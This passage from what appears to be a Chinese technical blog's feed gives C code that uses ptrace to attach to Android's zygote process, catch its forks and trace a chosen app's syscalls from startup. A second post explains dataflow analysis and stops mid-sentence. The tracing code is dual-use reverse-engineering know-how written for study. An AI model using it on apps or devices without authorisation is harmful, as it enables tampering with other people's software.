punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PTRACE_DETACH:%d\\n\"</span><span class=\"token punctuation\">,</span>ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>spawn模式</strong></p>\n<p>​\t有些程序的某些函数功能在启动之初就已经执行完毕，再使用attach一定来不及了。spawn模式的原理是ptrace到zygote进程，然后跟踪zygote进程的fork系统调用，如果fork出来的新进程是指定包名的app，那么detach掉zygote进程，进而跟踪目标app进程的系统调用。</p>\n<p>​\t64位下有两个zygote，zygote64和zygote。64位应用的父进程是zygote64，它的pgid也是zygote64的pid；32位应用的父进程是zygote，它的pgid却是zygote64的pid。</p>\n<p>启动流程：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">idle进程 -&gt; init进程 -&gt; zygote进程 -&gt; system_server进程 →App进程<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>启动zygote</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ptrace.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/wait.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/user.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;linux/ptrace.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;dirent.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;getopt.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">BUF_SIZE</span> <span class=\"token expression\"><span class=\"token number\">1024</span></span></span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">getNameByPid</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">pid_t</span> pid<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>task_name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> proc_pid_path<span class=\"token punctuation\">[</span>BUF_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span>BUF_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>proc_pid_path<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/proc/%d/status\"</span><span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    FILE<span class=\"token operator\">*</span> fp <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span>proc_pid_path<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span> <span class=\"token operator\">!=</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> BUF_SIZE<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%*s %s\"</span><span class=\"token punctuation\">,</span> task_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">int</span>         status<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span>         success <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token class-name\">pid_t</span>       wait_pid<span class=\"token punctuation\">;</span> \n\t<span class=\"token class-name\">pid_t</span>       target_pid <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">long</span> zygote_pid <span class=\"token operator\">=</span> <span class=\"token number\">1398</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// zygote进程的pid</span>\n\t<span class=\"token keyword\">char</span>  appname<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"com.example.x86demo\"</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// app的包名称</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Ptrace Zygote\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">int</span> res <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_ATTACH<span class=\"token punctuation\">,</span>zygote_pid<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>res <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"res: %d\\n\"</span><span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hook zygote error\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token function\">waitpid</span><span class=\"token punctuation\">(</span>zygote_pid<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">// 拦截zygote的fork操作</span>\n\tres <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_SETOPTIONS<span class=\"token punctuation\">,</span> zygote_pid<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>PTRACE_O_TRACEFORK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ptrace zygote PTRACE_O_TRACEFORK res: %d\\n\"</span><span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>res <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"FATAL ERROR: ptrace(PTRACE_SETOPTIONS, ...)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">// 恢复zygote的运行</span>\n\t<span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_CONT<span class=\"token punctuation\">,</span> zygote_pid<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zygote continue \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// fork后子进程的pid</span>\n            wait_pid <span class=\"token operator\">=</span> <span class=\"token function\">waitpid</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>status<span class=\"token punctuation\">,</span> __WALL <span class=\"token operator\">|</span> WUNTRACED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>status<span class=\"token operator\">&gt;&gt;</span><span class=\"token number\">8</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>SIGTRAP <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>PTRACE_EVENT_FORK<span class=\"token operator\">&lt;&lt;</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fork出子进程 status&gt;&gt;8 == (SIGTRAP | (PTRACE_EVENT_FORK&lt;&lt;8)) %d\\n\"</span><span class=\"token punctuation\">,</span>wait_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>wait_pid<span class=\"token operator\">==</span>zygote_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span> <span class=\"token comment\">//如果发出信号进程的进程号跟pid一致，则说明它是被跟踪程序的父进程，否则是被跟踪程序的子进程</span>\n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">WIFSTOPPED</span><span class=\"token punctuation\">(</span>status<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zygote continue \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_CONT<span class=\"token punctuation\">,</span>wait_pid<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token comment\">// 判断fork后的程序是不是我们指定的应用</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>wait_pid <span class=\"token operator\">!=</span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> wait_pid<span class=\"token operator\">!=</span>zygote_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">char</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">getNameByPid</span><span class=\"token punctuation\">(</span>wait_pid<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wait_pid: %d,name: %s\\n\"</span><span class=\"token punctuation\">,</span>wait_pid<span class=\"token punctuation\">,</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>appname<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"匹配到appname: %s\\n\"</span><span class=\"token punctuation\">,</span>appname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token comment\">// detach from zygote</span>\n                    <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_DETACH<span class=\"token punctuation\">,</span> zygote_pid<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>SIGCONT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Detach from zygote\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token comment\">// now perform on new process</span>\n                    target_pid <span class=\"token operator\">=</span> wait_pid<span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"appname: %s pid: %d\\n\"</span><span class=\"token punctuation\">,</span>appname<span class=\"token punctuation\">,</span>target_pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    success <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token comment\">// 拦截目标进程的clone和exit,clone重要 exit调试用</span>\n                    res <span class=\"token operator\">=</span> <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_SETOPTIONS<span class=\"token punctuation\">,</span> target_pid<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>PTRACE_O_TRACECLONE<span class=\"token operator\">|</span>PTRACE_O_TRACEEXIT<span class=\"token operator\">|</span>PTRACE_O_TRACEVFORK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ptrace PTRACE_O_TRACECLONE|PTRACE_O_TRACEEXIT res: %d\\n\"</span><span class=\"token punctuation\">,</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>res <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"FATAL ERROR: ptrace(PTRACE_SETOPTIONS, ...)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token comment\">// 不是的话就continue</span>\n                    <span class=\"token function\">ptrace</span><span class=\"token punctuation\">(</span>PTRACE_SYSCALL<span class=\"token punctuation\">,</span> wait_pid<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueGp4MTAwLmNuL25ld3MvNTEwMzU0Lmh0bWw/YWN0aW9uPW9uQ2xpY2s=\">https://www.xjx100.cn/news/510354.html?action=onClick</span></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2023/09/30/dataflowanalysis/",
            "url": "https://alazymechnaic.github.io/2023/09/30/dataflowanalysis/",
            "title": "DataFlowAnalysis",
            "date_published": "2023-09-30T06:48:10.000Z",
            "content_html": "<h1 id=\"DataFlow-Analysis\"><a href=\"#DataFlow-Analysis\" class=\"headerlink\" title=\"DataFlow Analysis\"></a>DataFlow Analysis</h1><hr>\n<h2 id=\"数据流分析的作用\"><a href=\"#数据流分析的作用\" class=\"headerlink\" title=\"数据流分析的作用\"></a>数据流分析的作用</h2><ul>\n<li><p><strong>简化执行代码</strong>:</p>\n<ul>\n<li>```c<br>// 在下面代码<br>x = a + b;<br>x = 5 * 2;<br>// 可以直接简化为<br>x = 10;<pre class=\"line-numbers language-none\"><code class=\"language-none\">\n- **变量取值分析**\n\n  - ```c\n    a = 1;\n    b = 2;\n    c = 3;\n    if (...) x = a + 5;\n    else x = b + 4;\n    c = x + 1;\n    // 虽然程序复杂但是可以直接简化为c = 7\n    c = 7;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"技术划分\"><a href=\"#技术划分\" class=\"headerlink\" title=\"技术划分\"></a>技术划分</h2><p>示例代码如下：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token number\">1.</span>   k <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">2.</span>   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token number\">3.</span>     a <span class=\"token operator\">=</span> k <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">4.</span>     x <span class=\"token operator\">=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">5.</span>   <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n<span class=\"token number\">6.</span>     a <span class=\"token operator\">=</span> k <span class=\"token operator\">*</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">7.</span>     x <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">8.</span>   <span class=\"token punctuation\">}</span>\n<span class=\"token number\">9.</span>   k <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n<span class=\"token number\">10.</span>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n<span class=\"token number\">11.</span>     b <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">12.</span>     x <span class=\"token operator\">=</span> a <span class=\"token operator\">+</span> k<span class=\"token punctuation\">;</span>\n<span class=\"token number\">13.</span>     y <span class=\"token operator\">=</span> a <span class=\"token operator\">*</span> b<span class=\"token punctuation\">;</span>\n<span class=\"token number\">14.</span>     k<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token number\">15.</span>  <span class=\"token punctuation\">}</span>\n<span class=\"token number\">16.</span>  <span class=\"token function\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">+</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"Constant-Propagation\"><a href=\"#Constant-Propagation\" class=\"headerlink\" title=\"Constant Propagation\"></a><em>Constant Propagation</em></h3><p>​\tconstant propagation本质是分析程序中某些变量的值的集合，表现为（变量，取值）的键值对</p>\n<p><img data-src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202309301506330.png\" alt=\"image-20230930150627177\"></p>\n<h3 id=\"Live-Variable-Analysis\"><a href=\"#Live-Variable-Analysis\" class=\"headerlink\" title=\"Live-Variable Analysis\"></a><em>Live-Variable Analysis</em></h3><p>​\t该分析的目的是找到当前时刻中的哪些变量，在内容被覆盖之前可能会被使用，这类变量称为live-Variable。该分析方式属于backward may的分析方法，需要依赖后续代码来生成前面的变量使用情况。</p>\n<h2 id=\"Define-DataFlow-Problem\"><a href=\"#Define-DataFlow-Problem\" class=\"headerlink\" title=\"Define DataFlow Problem\"></a>Define DataFlow Problem</h2><p>​\t在定义数据流问题之前需要先定义两个问题，第一个是<strong>前向传播</strong>（例如，constant propagation）问题，第二个是<strong>后向传播</strong>（例如，live-Variable分析）问题。常见的数据流分析中包含的往往是may和must问题，例如live分析的时候，只能说某个变量在某个节点的存活状态时may，但是在前向传播时某个变量的取值是must。</p>\n<h3 id=\"DataFlow-Problem\"><a href=\"#DataFlow-Problem\" class=\"headerlink\" title=\"DataFlow Problem\"></a>DataFlow Problem</h3><ul>\n<li>在程序开始执行时有哪些信息</li>\n<li>当一个结点存在多于一个的入度边时，如何将两个入度的信息进行合并？</li>\n<li>当每一个结点执行结束后，如何影响当前的数据流状态？</li>\n</ul>\n<p>在数据流分析中的相关定义如下：</p>\n<ul>\n<li>CFG</li>\n<li>a domain D of “dataflow facts” ： 这里给出的定义中，DataFlow facts是指在constant propagation中出现的变量与其对应值的键值对集合，这里的domain就是该集合的幂集，相应的live-variable分析中的就是变量集合的幂集</li>\n<li>a dataflow fact “init” ： 定义前向分析的起始位置或者后向分析的结束状态。这里两种分析的init状态都是空,因为在反向扫描时，从程序结束位置开始，此时的所有变量都寄了。</li>\n<li>an operator ⌈⌉ (used to combine incoming information from multiple predecessors)，该运算符在前向传播时用作交操作，在进行后向传播时用于并操作。只有当变量x在p1和p2之后都具有值v时，才能确定在节点n之前，变量x的值也是v。在”may”类型的数据流问题中，组合操作符⌈⌉通常是类似于并集的操作符，而在”must”类型的问题中，它通常是类似于交集的操作符。</li>\n</ul>\n<p>$$<br>fn(S) = (S - KILLn) ∪ GENn<br>$$</p>\n<p>​\t其中KILLn是在节点n处定义的变量集合，GENn是在节点n处使用的变量集合。对于不对任何变量进行赋值的节点，节点n之前的活跃变量是节点n之后的活跃变量加上在节点n处被使用的变量。对于对变量x进行赋值的节点，节点n之前的活跃变量是节点n之后的活跃变量中排除变量x后的部分，再加上在节点n处使用的变量（包括变量x，如果它在节点n处既被定义又被使用）。<strong>注意这里是一个反向分析的过程，n处声明的变量定义为kill是因为再向前扫描的话，变量肯定是不存在的。如果在结点n中被用到了，则表明在n之前肯定是活的。</strong></p>\n<h2 id=\"Solving-Dataflow-Problem\"><a href=\"#Solving-Dataflow-Problem\" class=\"headerlink\" title=\"Solving Dataflow Problem\"></a>Solving Dataflow Problem</h2><p>​\t本文中提到的分析方法是针对某个基本块结点n的分析方法。但是为了保证每个节点</p>\n<h3 id=\"The-“Meet-Over-All-Paths”-Solution\"><a href=\"#The-“Meet-Over-All-Paths”-Solution\" class=\"headerlink\" title=\"The “Meet Over All Paths” Solution\"></a>The “Meet Over All Paths” Solution</h3><p>​\tMOP的思想是尽可能多地结算到达节点n时的数据流情况，也就是要考虑到所有的路径，并取∩运算。然而这个结果也是“尽可能对”的结果。MOP方案考虑了所有到达结点n的路径上的数据流状况，但即使是这种分析方式也有可能是过于保守的，因为有些路径未必是实际可执行的，例如永真/永假式的存在，或者谓词之间不独立（一个表达式的正确与否与另一个表达式相关）。</p>\n<h3 id=\"MOP的问题\"><a href=\"#MOP的问题\" class=\"headerlink\" title=\"MOP的问题\"></a>MOP的问题</h3><p>​\tMOP方式的本质是枚举尽可能多的路径来计算其上的数据流，然而对于一些循环（路径爆炸相关）的问题中，MOP方式是结束不了的。</p>\n<p>​\t<em>As we shall see, if those functions are <em>distributive</em>, then the solution that we compute is identical to the MOP solution. If the functions are <em>monotonic</em>, then the solution may not be identical to the MOP solution, but is a conservative approximation.</em></p>\n<p>​\t这里贴一下原文吧，文中说如果这些函数满足分配律（distributive）的性质，那么我们计算得到的解将与MOP解相同。如果数据流函数是单调的（monotonic），那么计算得到的解可能与MOP解不完全相同，但是它是一种保守的近似。</p>\n<p>​\t文中给出的解决方法如下：</p>\n<p>n.before：n执行之前的信息，<br>n.after：n执行之后的信息。</p>\n<p>这些n.before和n.after是我们方程的变量，其定义如下（对于每个节点n有两个方程）：<br>        <strong>n.before = ∩(p1.after, p2.after, …)</strong><br>其中p1、p2等是n在CFG中的前驱节点（∩是此数据流问题的组合运算符）。<br>        <strong>n.after = fn(n.before)</strong></p>\n<p>也就是在结点n之前的状态信息是路径p1到pn的数据流的交集。结点n之后的状态由n之前的状态计算得出。通过解这些方程，我们可以计算出每个节点的数据流信息，从而得到整个程序的数据流分析结果。</p>\n<p>​\t<em>In general, for a “must” problem the desired solution will be the largest one, while for a “may” problem the desired solution will be the smallest 